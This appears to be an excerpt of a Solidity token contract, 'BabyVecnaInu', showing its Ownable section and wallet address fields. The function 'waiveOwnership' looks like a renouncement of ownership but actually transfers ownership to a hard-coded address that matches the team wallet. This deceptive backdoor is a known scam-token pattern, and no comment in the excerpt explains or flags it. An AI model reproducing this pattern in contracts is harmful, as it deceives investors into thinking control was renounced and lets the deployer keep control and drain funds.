...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x18975c228dcF901dc297D652E857D4F908275599));
        _owner = address(0x18975c228dcF901dc297D652E857D4F908275599);
    }
...
contract BabyVecnaInu is Context, IERC20, Ownable {
    ...
    string private _name = "BabyVecnaInu";
    string private _symbol = "BABYVECNA";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x8da5972484FACc9c35a472fB6F82E2E2d88C6B5C);
    address payable public teamWalletAddress = payable(0x18975c228dcF901dc297D652E857D4F908275599);
